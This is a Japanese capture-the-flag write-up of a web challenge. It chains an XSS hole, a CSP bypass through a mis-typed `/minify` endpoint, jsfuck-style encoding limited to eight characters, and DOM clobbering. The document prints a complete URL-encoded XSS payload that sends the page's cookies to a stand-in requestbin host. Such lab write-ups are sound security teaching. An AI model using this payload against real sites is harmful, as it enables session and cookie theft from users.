`/:codeId`のページに自明なXSS脆弱性がありますが、CSPが設定されているためインラインあるいは外部のJavaScriptを実行することができません。しかし、`/minify`エンドポイントにおいて`content-type`ヘッダが適切に設定されていないため、これをJavaScriptとして読み込ませることができます。つまり、`><+-=[]r`の8文字でXSSのペイロードを書かなければなりません。

幸い、今回は任意のHTMLを挿入できるのに加えて文字`r`も使えるので、DOM Clobberingを使ってDOMにアクセスできます。ペイロードの基本的なアイデアは以下の通りです。

```js
element['ownerDocument']['defaultView']['location']='https://requestbin.example.com/?'+element['ownerDocument']['cookie']
```

[jsfuck](https://github.com/aemkei/jsfuck)を参考に、文字列`alt`を以下のように作ることができます。

```js
// 'alt' === 'NaN'[1] + 'false'[2] + 'true'[0]
console.log(
    [+[][[]]+[]][+[]][++[[]][+[]]]+[[[[]>[]][+[]]]+[]][+[]][++[++[[]][+[]]][+[]]]+[[[]>=[]]+[]][+[]][+[]]
) // 'alt'
```

XSSで挿入した`img`要素の`alt`属性を取得することで、任意の文字列を得ることができます。

```html
<!-- payloadの例 -->
<img alt="ownerDocument" id="rr">
<img alt="defaultView" id="rrr">
<img alt="location" id="rrrr">
<img alt="cookie" id="rrrrr">
<a href="https://requestbin.example.com/?" id="rrrrrr"></a>
<script src="/minify?code=rr%5Brr%5Br%3D%5B%2B%5B%5D%5B%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B%2B%2B%5B%5B%5D%5D%5B%2B%5B%5D%5D%5D%2B%5B%5B%5B%5B%5D%3E%5B%5D%5D%5B%2B%5B%5D%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B%2B%2B%5B%2B%2B%5B%5B%5D%5D%5B%2B%5B%5D%5D%5D%5B%2B%5B%5D%5D%5D%2B%5B%5B%5B%5D%3E%3D%5B%5D%5D%2B%5B%5D%5D%5B%2B%5B%5D%5D%5B%2B%5B%5D%5D%5D%5D%5Brrr%5Br%5D%5D%5Brrrr%5Br%5D%5D%3Drrrrrr%2Brr%5Brr%5Br%5D%5D%5Brrrrr%5Br%5D%5D"></script>
```

JS部分（コメント付き）：

```js
rr[
    // r === 'alt'
    // 'ownerDocument'
    rr[r=[+[][[]]+[]][+[]][++[[]][+[]]]+[[[[]>[]][+[]]]+[]][+[]][++[++[[]][+[]]][+[]]]+[[[]>=[]]+[]][+[]][+[]]]
][
    // 'defaultView'
    rrr[r]
][
    // 'location'
    rrrr[r]
] = rrrrrr /* rrrrrr.toString() === rrrrrr.href */ + rr[
    // 'ownerDocument'
    rr[r]
][
    // 'cookie'
    rrrrr[r]
]
```

`/submit`にペイロードを送信し、XSSを仕込んだページを報告すると、対象ページにアクセスしたクローラーが外部のサーバにフラグを送信します。
